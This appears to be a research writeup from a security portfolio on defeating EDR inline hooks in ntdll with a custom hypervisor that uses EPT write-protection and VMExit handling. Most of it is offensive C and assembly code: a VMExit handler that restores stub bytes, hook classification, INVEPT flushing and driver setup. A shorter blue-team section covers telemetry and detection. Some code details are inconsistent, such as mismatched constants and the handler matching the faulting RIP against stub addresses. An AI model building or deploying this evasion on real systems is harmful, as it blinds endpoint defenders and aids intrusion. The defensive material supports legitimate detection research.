---
title: "Dynamic API Unhooking via VMExit: Hypervisor-Level Ephemeral Syscall Stub Restoration"
author: Utku
date: 2026
tags: [EDR-bypass, VMExit, EPT, hypervisor, syscall-stub, ntdll, inline-hook, VMEXIT, WinDbg, VMX, Windows, AV-evasion, blue-team]
license: CC BY 4.0
---

> **Author's Note:** EDR inline hooks are fundamentally a user-mode problem — bytes written at the entry of `ntdll` syscall stubs that redirect control to the EDR before the kernel transition. The standard attacker responses (direct syscall, manual syscall stub from a clean ntdll copy, DInvoke) are all static. They produce forensic artifacts: a mapped "clean ntdll" in process memory, a syscall number that never appears through the normal stub path, or a function pointer that resolves outside the expected module range. The hypervisor approach is different because the unhook happens exactly once, for exactly the duration of the syscall transition, and disappears before any memory scan can catch it. The word "ephemeral" is doing real work here. The attacker's modification is invisible in any offline dump, invisible to a concurrent memory scanner, and invisible to the EDR's own hook — because by the time the EDR's hook would have been reached, it was already overwritten back to the original bytes.

---

## Abstract

EDR and AV products deploy inline hooks on `ntdll.dll` syscall stubs — most commonly `NtOpenProcess`, `NtReadVirtualMemory`, `NtWriteVirtualMemory` — by overwriting the first bytes with a `JMP`, `INT3`, or `MOV EAX` to redirect control through the EDR's inspection logic before the kernel transition. This writeup develops a hypervisor-level countermeasure: syscall stub pages are marked EPT write-protected, so any write attempt (the EDR placing its hook) causes a VMExit; the hypervisor restores the original bytes, re-protects the page, and resumes the guest. The unhook is just-in-time (JIT) — it exists only during the window between the VMExit and `VMRESUME`, which is shorter than any polling interval or memory scan. The system includes: multi-stub monitoring (`syscall_stub_t` array with per-stub `restore_count`), hook classification (`0xE9/0xE8` = JMP, `0xCC` = INT3, `0x0F` = SYSCALL overwrite, `0xCD 0x2E` = INT 2E shadow), `CR3`-to-PID resolution for process attribution, and `before.bin`/`after.bin` forensic dumps. A blue-team telemetry agent running SHA-256 hash comparisons between in-memory and on-disk `ntdll` first 128 bytes, correlated with VMExit rate and syscall latency, provides the detection surface.

---

## §1 The Problem: EDR Inline Hooks

The standard Windows syscall path for a user-mode caller:

```
caller → ntdll!NtOpenProcess stub → syscall → NT kernel → return
```

An EDR installs a hook by patching the first bytes of the stub:

```asm
; Original (clean) NtOpenProcess stub
4c 8b d1        mov r10, rcx
b8 26 00 00 00  mov eax, 0x26       ; syscall number
f6 04 25 ...    test byte ptr [SharedUserData+0x308], 1
75 03           jne ...
0f 05           syscall
c3              ret

; EDR-hooked version (inline JMP example)
e9 xx xx xx xx  jmp <edr_handler>   ; first 5 bytes overwritten
...             (original bytes shifted or trashed)
```

The EDR's handler receives the call, inspects arguments, then either allows the syscall through or blocks it. The attacker's goal is to make the syscall reach the kernel without passing through this inspection layer.

**Why static approaches have limits:**

| Technique | Limitation |
|---|---|
| Direct syscall (inline `syscall`) | Syscall number must be hardcoded per-build; no ntdll path resolution |
| Clean ntdll mapping | Second `ntdll` loaded at different base — anomalous PFN, detectable by EDR's own scan |
| Syscall stub from on-disk copy | On-disk hash matches, but loading mechanism leaves traces |
| DInvoke / manual mapping | Reflective injection artifacts in PEB loader table |

The hypervisor approach has none of these artifacts because it does not create an alternative path — it momentarily restores the original path.

---

## §2 Architecture: EPT Write-Protect and VMExit Trigger

The mechanism relies on Extended Page Tables (EPT), which translate Guest Physical Addresses (GPAs) to Host Physical Addresses (HPAs) under hypervisor control. Each EPT page table entry (PTE) carries independent Read/Write/Execute bits.

**Setup:** Mark the page containing the syscall stubs as EPT `W=0` (read-only):

```
EPT PTE for ntdll syscall stub page:
  R=1 (readable)
  W=0 (not writable)   ← causes VMExit on any write attempt
  X=1 (executable)
```

When the EDR attempts to write its hook bytes (`mov [NtOpenProcess], 0xE9...`), the guest executes a memory write to a page that is EPT write-protected. The CPU cannot complete the write without hypervisor approval — it raises `EXIT_REASON_EPT_VIOLATION (48)`.

The VMExit handler intercepts this, restores the original bytes using a known-good copy, marks the page write-protected again, and calls `VMRESUME`. The EDR's write never lands. The guest sees the original stub bytes.

```
EDR writes JMP to ntdll stub page
    → EPT violation (W=0) → EXIT_REASON_EPT_VIOLATION (0x30)
        → vmexit_handler()
            → is_monitored_stub(guest_rip)?
                → yes: translate VA→PA, map page in host
                → memcmp(current_bytes, original_bytes)
                    → mismatch: ept_enable_write, memcpy, ept_disable_write
                → flush_ept_tlb (INVEPT)
        → VMRESUME
    → guest continues with original stub bytes
    → syscall reaches kernel cleanly
```

---

## §3 Stub Discovery and Baseline

Before any runtime monitoring, the exact addresses and original bytes of each stub must be established. WinDbg on the target Windows build:

```text
.sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
.symfix+
.reload /f ntdll

x ntdll!NtOpenProcess
bp ntdll!NtOpenProcess ".echo NtOpenProcess called; u ntdll!NtOpenProcess L6; g"
```

From a Windows 10 x64 build, the three monitored stubs:

```ini
; ntdll base: 0x00007ffc3efb0000

NtOpenProcess        = 0x00007ffc3f04d510
NtReadVirtualMemory  = 0x00007ffc3f04d830
NtWriteVirtualMemory = 0x00007ffc3f04d790
```

WinDbg `db ntdll!NtOpenProcess L16` output (original, unhoooked):

```
4c 8b d1 b8 26 00 00 00 f6 04 25 08 03 fe 7f 01
```

Disassembly:
```asm
mov r10, rcx
mov eax, 26h              ; NtOpenProcess syscall number
test byte ptr [SharedUserData+0x308], 1
jne ...
syscall
ret
```

These 16 bytes become the "gold copy" stored in the hypervisor for each stub.

---

## §4 Core Data Structures

```c
#define STUB_COUNT 3
#define STUB_LEN   16

typedef struct {
    uint64_t addr;             // stub virtual address
    uint8_t  original[16];     // gold copy from pre-hook baseline
    int      restore_count;    // telemetry: how many times restored
} syscall_stub_t;

syscall_stub_t monitored_stubs[] = {
    // NtOpenProcess
    { 0x00007ffc3f04d510,
      {0x4c,0x8b,0xd1,0xb8,0x26,0x00,0x00,0x00,
       0xf6,0x04,0x25,0x08,0x03,0xfe,0x7f,0x01} },
    // NtReadVirtualMemory
    { 0x00007ffc3f04d830,
      {0x4c,0x8b,0xd1,0xb8,0x3f,0x00,0x00,0x00,
       0xf6,0x04,0x25,0x08,0x03,0xfe,0x7f,0x01} },
    // NtWriteVirtualMemory
    { 0x00007ffc3f04d790,
      {0x4c,0x8b,0xd1,0xb8,0x3a,0x00,0x00,0x00,
       0xf6,0x04,0x25,0x08,0x03,0xfe,0x7f,0x01} },
};
```

`restore_count` per stub enables per-API telemetry: "NtOpenProcess has been hooked and restored 14 times; NtWriteVirtualMemory 0 times" is a meaningful signal for understanding which APIs the monitored process is calling and which the EDR most aggressively targets.

---

## §5 VMExit Handler: Full Logic

```c
#define VMCS_EXIT_REASON   0x4402
#define VMCS_GUEST_RIP     0x681E
#define VMCS_GUEST_CR3     0x6802
#define EXIT_REASON_EPT_VIOLATION 48

void vmexit_handler() {
    uint64_t exit_reason = vmread(VMCS_EXIT_REASON);
    uint64_t guest_rip   = vmread(VMCS_GUEST_RIP);

    syscall_stub_t *stub = NULL;
    if (!is_monitored_stub(guest_rip, &stub)) {
        vmresume();
        return;  // fast path: not our stub, don't waste time
    }

    if (exit_reason == EXIT_REASON_EPT_VIOLATION) {
        uint64_t guest_phys = translate_va_to_pa(guest_rip);
        void *host_ptr = ept_map_guest_page(guest_phys);

        if (memcmp(host_ptr, stub->original, STUB_LEN) != 0) {
            // Hook detected — classify, attribute, restore
            char hooktype[32];
            classify_patch(host_ptr, hooktype);

            uint64_t cr3 = vmread(VMCS_GUEST_CR3);
            int pid = cr3_to_pid(cr3);

            log_event("PID=%d HookType=%s RIP=0x%llx\n",
                      pid, hooktype, guest_rip);
            dump_bytes("before.bin", host_ptr, STUB_LEN);

            ept_enable_write(guest_phys);
            memcpy(host_ptr, stub->original, STUB_LEN);
            ept_disable_write(guest_phys);
            flush_ept_tlb(guest_phys);  // INVEPT

            stub->restore_count++;
            dump_bytes("after.bin", stub->original, STUB_LEN);
        }

        ept_unmap_guest_page(host_ptr);
    }

    vmresume();
}

bool is_monitored_stub(uint64_t rip, syscall_stub_t **out) {
    for (int i = 0; i < NUM_STUBS; i++) {
        if (rip == monitored_stubs[i].addr) {
            *out = &monitored_stubs[i];
            return true;
        }
    }
    return false;
}
```

**Performance path:** The `is_monitored_stub()` check is intentionally first. Every VMExit on this system goes through this handler; without the early exit, the handler would re-examine all stubs on every EPT violation, including those for completely unrelated pages. The linear scan over 3 entries is O(3) — negligible. For larger stub tables, a hash map on the address is the natural upgrade.

---

## §6 Hook Classifier

```c
void classify_patch(void *bytes, char *out_type) {
    uint8_t b0 = ((uint8_t *)bytes)[0];
    uint8_t b1 = ((uint8_t *)bytes)[1];

    if (b0 == 0xE9 || b0 == 0xE8)          // relative JMP / CALL
        strcpy(out_type, "JMP");
    else if (b0 == 0xCC)                   // INT3 breakpoint
        strcpy(out_type, "INT3");
    else if (b0 == 0x0F && b1 == 0x05)     // SYSCALL overwrite (rare)
        strcpy(out_type, "SYSCALL");
    else if (b0 == 0xCD && b1 == 0x2E)     // INT 2E (legacy syscall shadow)
        strcpy(out_type, "INT2E");
    else
        strcpy(out_type, "UNKNOWN");
}
```

The classifier exists for telemetry, not for decision-making. The restoration logic is the same regardless of hook type: copy the gold bytes back. But knowing whether the EDR uses JMP-style hooks versus INT3-style traps is operationally useful — it identifies the EDR vendor's hooking methodology and helps tune the polling window.

---

## §7 INVEPT: Why TLB Flush Is Mandatory

After `ept_enable_write` → `memcpy` → `ept_disable_write`, the EPT page table entry has been modified twice (W=1 then W=0). The CPU's TLB may hold the stale `W=1` mapping. Without invalidation, subsequent accesses to this page could use the stale entry — allowing another write to land before the next VMExit.

`INVEPT` (opcode `66 0F 38 80`) invalidates EPT TLB entries. Type 2 (all-context) is safest on multi-core systems where other vCPUs may hold stale entries:

```asm
; invept.asm (MASM x64, for MSVC — x64 does not support inline __asm)
PUBLIC invept

.code
invept PROC
    ; rcx = type (1=single, 2=all-context)
    ; rdx = INVEPT_DESC pointer (128-bit: EptPointer + Reserved)
    db 066h, 0Fh, 038h, 080h   ; INVEPT r64, m128
    ret
invept ENDP
END
```

The descriptor struct:

```c
typedef struct _INVEPT_DESC {
    unsigned __int64 EptPointer;   // for type 1; zero for type 2
    unsigned __int64 Reserved;
} INVEPT_DESC;

void flush_ept_tlb(uint64_t pa) {
    UNREFERENCED_PARAMETER(pa);
    INVEPT_DESC desc = { 0 };
    invept(2, &desc);  // all-context flush
}
```

---

## §8 CR3 to PID Resolution

`VMCS_GUEST_CR3` holds the guest's current page table base register at the time of the VMExit. Each Windows process has a unique `CR3` value corresponding to `EPROCESS.DirectoryTableBase`. Resolution requires walking the kernel process list:

```c
int cr3_to_pid(uint64_t cr3) {
    // Production: walk PsActiveProcessHead, match DirectoryTableBase
    // PoC stub: return current process ID
    PEPROCESS proc = PsGetCurrentProcess();
    return (int)(ULONG_PTR)PsGetProcessId(proc);
}
```

The production implementation iterates `PsActiveProcessHead`, comparing `EPROCESS.DirectoryTableBase` against `cr3` until a match is found, then reads `EPROCESS.UniqueProcessId`. This gives the log line `PID=1234 HookType=JMP RIP=0x00007ffc3f04d510` — enough to answer "which process triggered the EDR hook?" without requiring any user-mode cooperation.

---

## §9 Blue-Team: Detection and Telemetry

The JIT unhook is invisible to static analysis and memory snapshots. The detectable signals are behavioral and require correlation:

### Endpoint Agent

```c
#define SAMPLE_BYTES 128   // covers syscall stub entry and any hook overwrite
#define MIN_POLL_MS  3000
#define MAX_POLL_MS  7000

typedef struct {
    char     host[64];
    uint64_t ts_ms;
    pid_t    pid;
    char     proc_path[512];
    uint8_t  mem_hash[32];     // SHA-256 of in-memory first 128 bytes of ntdll
    uint8_t  disk_hash[32];    // SHA-256 of on-disk first 128 bytes of ntdll
    uint64_t syscall_count;
    double   avg_syscall_latency_ms;
} Telemetry;

void collect_for_process(pid_t pid) {
    uint8_t membuf[SAMPLE_BYTES], diskbuf[SAMPLE_BYTES];
    uintptr_t base = get_module_base(pid, "ntdll.dll");
    read_proc_mem(pid, base, membuf, SAMPLE_BYTES);
    read_file_first_n("C:\\Windows\\System32\\ntdll.dll", diskbuf, SAMPLE_BYTES);
    // hash both, send to SIEM
}
```

`SAMPLE_BYTES = 128` covers the first stub entries (which start around offset `+0xC0000` from ntdll base) and any hook overwrite. Jitter in the poll interval (`MIN/MAX`) prevents an attacker from timing the restoration to fall between two consecutive samples.

### SIEM Correlation Flow

```
[Agent] mem_hash != disk_hash → telemetry alert
[Hypervisor] VMExit rate spike on EXIT_REASON_EPT_VIOLATION
[SIEM] correlate:
    hash mismatch + EPT spike + syscall latency anomaly → HIGH priority alert
```

Single-signal detection is low fidelity:
- Hash mismatch alone: process startup, ASLR rebase, or legitimate patching can cause it
- VMExit spike alone: any legitimate hypervisor workload or VM introspection tool

Three-signal correlation is high fidelity. The combination of "in-memory bytes changed + hypervisor saw write attempts at stub addresses + syscall latency higher than baseline" is not produced by legitimate workloads.

### Incident Response Path

1. Isolate the VM (containment)
2. `RAM dump + process dump` before shutdown
3. Compare time-stamped memory snapshots (zaman bazlı memory diff): `before.bin` and `after.bin` from the hypervisor's own forensic output
4. Confirm ephemeral patch: if no diff in final dump but hook activity in hypervisor logs, JIT unhook is confirmed
5. Attribute to process via CR3→PID mapping in hypervisor telemetry

---

## §10 VMCS Field Reference

```c
// vmx.h — VMCS field encodings (Intel SDM Vol.3, Appendix B)
#define VMCS_EXIT_REASON        0x4402
#define VMCS_GUEST_RIP          0x681E
#define VMCS_GUEST_CR3          0x6802

// VM Exit reasons (Intel SDM Vol.3, Table C-1)
#define EXIT_REASON_CPUID            10
#define EXIT_REASON_CR_ACCESS        28
#define EXIT_REASON_MSR_READ         31
#define EXIT_REASON_MSR_WRITE        32
#define EXIT_REASON_EPT_VIOLATION    48
#define EXIT_REASON_EPT_MISCONFIG    49
```

---

## §11 Driver Entry

```c
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DriverObject->DriverUnload = DriverUnload;

    // Enable VMX: check and set IA32_FEATURE_CONTROL (MSR 0x3A)
    IA32_FEATURE_CONTROL_MSR fc;
    fc.All = __readmsr(0x3A);
    if (!fc.Fields.Lock) {
        fc.Fields.Lock = fc.Fields.EnableVmxon = 1;
        __writemsr(0x3A, fc.All);
    }
    if (!fc.Fields.EnableVmxon) return STATUS_UNSUCCESSFUL;

    // Allocate and initialize VMXON region
    void *vmxon = MmAllocateContiguousMemorySpecifyCache(
        PAGE_SIZE, Low, High, Align, MmCached);
    RtlZeroMemory(vmxon, PAGE_SIZE);
    *(uint32_t *)vmxon = (uint32_t)__readmsr(0x480);  // IA32_VMX_BASIC revision
    __vmx_on((ULONGLONG *)MmGetPhysicalAddress(vmxon).QuadPart);

    VmxEnabled = TRUE;
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    if (VmxEnabled) __vmx_off();
}
```

---

## Portfolio Relationships

- **[PatchGuard Hypervisor Bypass](../PatchGuard-Hypervisor-Bypass-Writeup/)** — same VMX/EPT infrastructure applied to a different target: hiding kernel hooks from Ring-0 integrity checking rather than from user-mode EDR.
- **[CET-COOP Bypass](../CET-COOP-Bypass-Writeup/)** — user-mode control-flow subversion; no hypervisor layer. Shows the defense stack from the other direction.
- **[Vsock UAF](../Vsock-UAF-Writeup/)** — Linux kernel exploitation for contrast: primitive acquisition without a hypervisor intermediary.
